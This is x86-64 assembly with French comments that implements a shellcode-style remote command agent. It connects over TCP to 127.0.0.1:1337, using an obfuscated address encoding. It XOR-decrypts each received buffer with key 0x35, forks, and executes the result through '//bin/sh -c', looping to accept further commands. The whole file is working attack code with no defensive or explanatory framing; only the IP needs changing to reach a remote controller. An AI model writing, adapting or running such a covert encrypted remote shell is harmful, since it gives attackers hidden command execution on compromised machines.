BITS 64

SECTION .bss
	sock_buffer resb 255

SECTION .text
global _start
_start:

; ----- () sys_socket -----
_socket:
        xor rbx,rbx
        xor rax,rax
        xor rcx,rcx
        xor rdx,rdx                     ; purge registers

        push byte 2                     ; Family - AF_INET (2) pour IPv4
        pop rdi
        push byte 1                     ; type - SOCK_STREAM
        pop rsi
        xor rdx, rdx
        mov al, 41                      ; syscall socket
        syscall
        mov r15, rax			        ; saving socket

; ----- () sys_connect -----
_connect:
	xor rdi, rdi                    
    xor rsi, rsi
    xor rdi, rdi

    mov rdi, r15                    ; getting fd

    mov rcx, 0x12111190             ; set IP to 127.0.0.1(0x12111190) + 0x11111111
    sub rcx, 0x11111111             ; -> - 0x11111111 pour arriver à 127.0.0.1

    push rcx
    push word 0x3905                ; port 1337
    push word 2
    mov rsi, rsp                    ; struct sockaddr

    push byte 36
    pop rdx                         ; addrlen = 36

    mov al, 42
    syscall


; ----- (0) sys_read (unsigned int fd, char *buf, size_t count) -----
_read:
    xor r12, r12
	xor rax, rax
	xor rdi, rdi
	xor rsi, rsi
	xor rcx, rcx

	mov rdi, r15			; rdi <- unsigned int fd
	
	push sock_buffer
	mov rsi, rsp			; rsi <- char *buf : 
					        ; destination (on alloue une la taille de 255 à la mémoire)
		
	mov rdx, 255			; rdx <- size_t count : on lui donne la taille du buffer
	syscall

    mov rbx, rax            ; get size of what is received

	cmp rax, 0
    jz _exit               ; jump in exit if receved is nothing

_decrypt_xor:              ; xor decrypt function
    ; rsi = buffer
    ; rbx = size buffer
    ; rdx (dl) = xor key
    mov rdx, 0x35           ; xor_key = 5 (ascii) = 0x35

    next_byte:
        xor [rsi+rbx-1], dl
        dec rbx
        jne next_byte

	mov r12, rsi          ; mov fd in r12

; ---- (57) sys_fork ----
_fork:
	mov al, 57			; sys_fork
	syscall

	cmp rax, 0			; compare if in child process
	je _execve			; jmp child process to execve

    cmp rax, -1
    je _send_error      ; if fork failed -> goto send_error

	jmp _read			; jmp in parent sys_connect if in parent process


; ----- (59) execve (const char *filename, const char *const argv[], const char *const envp[]) -----
_execve:
    xor rbx, rbx
    xor rcx, rcx
	xor rsi, rsi	
	xor r13, r13
        
	push rbx
    mov rbx, 0x68732f6e69622f2f     ; //bin/sh
        
	push rcx			; push 0
	push rbx			; push //bin/sh
    mov rdi, rsp        ; rdi arg : const char *filename

	push rcx			; push 0 -> cleaning stack

	mov r13, 0x632d		; "-c"
	push r13			; push "-c"
	mov r14, rsp		; char * '-c'
	
	push rcx			; push 0
	
	push r12			; push fd de sys_read
	mov r12, [rsp]      ; mov du contenu de r12 afin de prendre plus que 8byte
	
	push rcx			; push 0

	push rbx			; push //bin/sh (rbx)
	mov rbx, rsp		; char * '//bin/sh'
	
	push rcx			; push 0 -> cleaning stack

	push r12			; push fd de sys_read
	push r14			; push -c
	push rbx			; push //bin/sh

	mov rsi, rsp			; get [ //bin/sh, -c, fd_sock_buffer ]
    mov rdx, rcx

    mov al, 59                      ; syscall 59 - execve
    syscall

_exit:
; ---- (3) sys_close (unsigned int fd) ---- close the pipe
    ;mov al, 3
    ;mov rdi, r15
    ;syscall
; ---- (60) sys_exit (int error_code) ----
    mov       al, 60         ; system call for exit
    xor       rdi, rdi                ; exit code 0
    syscall                           ; invoke operating system to exit

_send_error:
; ---- (2) sys_write (unsigned int fd, const char *buf, size_t count) ----
    xor rcx, rcx

    mov rcx, 0x726f727265       ; "error"
    push rcx
    mov rsi, rsp                ; rsi = const char *buf

    push 5
    pop rdx                 ; rdx = size_t count = msg size

    mov rdi, r15

    mov rax, 1

    syscall

    jmp _exit